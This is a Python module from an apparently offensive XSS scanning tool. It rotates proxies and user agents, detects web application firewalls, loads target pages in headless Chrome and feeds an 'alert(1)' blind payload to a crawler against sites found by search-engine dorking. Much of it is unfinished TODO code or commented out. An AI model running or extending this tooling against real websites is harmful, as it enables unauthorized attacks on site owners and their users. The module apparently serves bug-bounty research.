#########################################################################################
# XSS Vulnerability testing functions
#########################################################################################
import base64
import random
import sys
import concurrent.futures
import threading
import time
from urllib.parse import urlparse

from termcolor import cprint
from tqdm import tqdm

from attacks.dorks.search_engine_dorking import get_proxies_and_cycle
from attacks.xss.xss_striker import attacker_crawler
from reporting.results_manager import update_attack_result
from vpn_proxies.proxies_manager import prepare_proxies
from bypasser.waf_mitigation import waf_detector
from utils.app_config import (
    USER_AGENTS,
)

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
except ImportError:
    print(
        "Selenium and webdriver_manager modules not found. Please make sure they are installed."
    )
    sys.exit(1)


def test_xss_target(url, proxy, config, dork_id, link_id, attack_id):
    proxies = prepare_proxies(proxy, config)
    is_waffed = waf_detector(url=url, proxies=proxies, config=config, mode="xss")

    if is_waffed:
        cprint(f"WAF detected <!>", color="red", file=sys.stderr)
    else:
        cprint("WAF Status: Offline", color="green", file=sys.stderr)

    secured = False
    proxies = prepare_proxies(proxy, config)

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "X-HackerOne-Research": "elniak",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip,deflate",
        "Connection": "close",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "DNT": "1",
        "Upgrade-Insecure-Requests": "1",
    }

    try:
        # TODO take screenshot
        options = Options()
        options.headless = True
        if proxy:
            options.add_argument(f"--proxy-server={proxy}")
        # service=Service('/path/to/chromedriver'),
        driver = webdriver.Chrome(options=options)

        # Create a request interceptor
        def interceptor(request):
            request.headers = headers

        # Set the interceptor on the driver
        driver.request_interceptor = interceptor

        driver.get(url)
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )
        html_content = driver.page_source
        driver.quit()

        if url in html_content:
            cprint(f"[VULNERABLE XSS] {url}", "green", file=sys.stderr)
            update_attack_result(
                config, dork_id, link_id, attack_id, "xss", True, "payload TODO"
            )
            return
        update_attack_result(
            config, dork_id, link_id, attack_id, "xss", False, "payload TODO"
        )
        delay = random.uniform(config["current_delay"] - 2, config["current_delay"] + 2)
        time.sleep(delay)  # Wait before retrying
    except Exception as e:
        cprint(
            f"Error searching Selenium for {url} with proxy {proxies}: {e}",
            "red",
            file=sys.stderr,
        )
        update_attack_result(
            config, dork_id, link_id, attack_id, "xss", False, "payload TODO"
        )
        delay = random.uniform(config["current_delay"] - 2, config["current_delay"] + 2)
        time.sleep(delay)
        return
    finally:
        driver.quit()
        cprint(
            f"[NOT VULNERABLE XSS] {url}",
            "red",
            file=sys.stderr,
        )
    # try:
    #     if (
    #         payload_url
    #         in requests.Session()
    #         .get(
    #             payload_url,
    #             proxies=proxies,
    #             headers=headers,
    #             timeout=config["request_delay"],
    #             allow_redirects=True,
    #             verify=secured,
    #         )
    #         .text
    #     ):
    #         cprint(f"Payload URL: {payload_url}", color="green", file=sys.stderr)
    #         potential_payloads.append(payload_url)
    #     delay = random.uniform(
    #         config["current_delay"] - 2, config["current_delay"] + 2
    #     )
    #     time.sleep(delay)  # Wait before retrying
    # except requests.exceptions.ProxyError as e:
    #     cprint(
    #         f"ProxyError searching for {payload_url} with proxy {proxies}: {e}",
    #         "red",
    #         file=sys.stderr,
    #     )
    #     delay = random.uniform(
    #         config["current_delay"] - 2, config["current_delay"] + 2
    #     )
    #     time.sleep(delay)  # Wait before retrying
    # except requests.exceptions.RequestException as e:
    #     cprint(
    #         f"RequestException searching for {payload_url} with proxy {proxies}: {e}",
    #         "red",
    #         file=sys.stderr,
    #     )
    #     delay = random.uniform(
    #         config["current_delay"] - 2, config["current_delay"] + 2
    #     )
    #     time.sleep(delay)  # Wait before retrying


def launch_xss_attack(config, website_to_test):
    """
    Test a list of websites for XSS vulnerability using multithreading and proxies.
    """
    if len(website_to_test) > 0:
        try:
            proxies, proxy_cycle = get_proxies_and_cycle(config)
            number_of_worker = len(proxies)
            # TODO: use blind-xss-payload-list.txt
            # configure a domain for the attacks

            if config["fuzz_xss"]:
                raise NotImplementedError("Fuzzing is not implemented yet")
            else:
                blindPayloads = "alert(1)"  # TODO
                encoding = base64 if config["encode_xss"] else False
                with concurrent.futures.ThreadPoolExecutor(
                    max_workers=number_of_worker
                ) as executor:
                    future_to_search = {
                        executor.submit(
                            attacker_crawler,
                            # scheme,
                            # host,
                            # main_url,
                            form,
                            blindPayloads,
                            encoding,
                            config,
                            next(proxy_cycle),
                        ): form
                        for form, domURL in zip([], [])  # TODO use domURL
                    }
                    for website in tqdm(
                        concurrent.futures.as_completed(future_to_search),
                        desc=f"Attacker Crawling links DB for xss website",
                        unit="site",
                        total=len(future_to_search),
                    ):
                        website.result()

                # lock = threading.Lock()

                # # Now, append a proxy to each task
                # number_of_worker = len(proxies)
                # search_tasks_with_proxy = []
                # for website in website_to_test:
                #     total_parsed_targets = []
                #     try:
                #         cprint(
                #             f"Intializing Payload Generator for url {website}",
                #             color="yellow",
                #             file=sys.stderr,
                #         )
                #         parsed_target = generate_xss_urls(website)
                #         cprint(
                #             f"Generated {parsed_target[1]} payloads",
                #             color="yellow",
                #             file=sys.stderr,
                #         )
                #         for each in parsed_target[0]:
                #             total_parsed_targets.append(each)

                #         cprint(
                #             f"Total Parsed Targets: {len(total_parsed_targets)}",
                #             color="yellow",
                #             file=sys.stderr,
                #         )
                #         for url in total_parsed_targets:
                #             proxy = next(proxy_cycle)
                #             search_tasks_with_proxy.append({"website": url, "proxy": proxy})
                #     except Exception as e:
                #         cprint(
                #             f"Error generating payloads for {website}: {e}",
                #             "red",
                #             file=sys.stderr,
                #         )

                # with concurrent.futures.ThreadPoolExecutor(
                #     max_workers=number_of_worker
                # ) as executor:
                #     future_to_search = {
                #         executor.submit(
                #             test_xss_target, task["website"], task["proxy"], config
                #         ): task
                #         for task in search_tasks_with_proxy
                #     }
                #     for website in tqdm(
                #         concurrent.futures.as_completed(future_to_search),
                #         desc=f"Testing for XSS",
                #         unit="site",
                #         total=len(future_to_search),
                #     ):
                #         result, payload_url = website.result()

                # if vuln_path:
                #     driver.execute_script("window.open('');")
                #     driver.switch_to.window(driver.window_handles[-1])
                #     for vulnerable_url in vuln_path:
                #         driver.get(vulnerable_url)
        except KeyboardInterrupt:
            cprint(
                "Process interrupted by user during xss attack phase ... Saving results (TODO)",
                "red",
                file=sys.stderr,
            )
            exit(1)
        except Exception as e:
            cprint(f"Error: {e}", color="red", file=sys.stderr)
    else:
        cprint("No Potential XSS", color="red", file=sys.stderr)
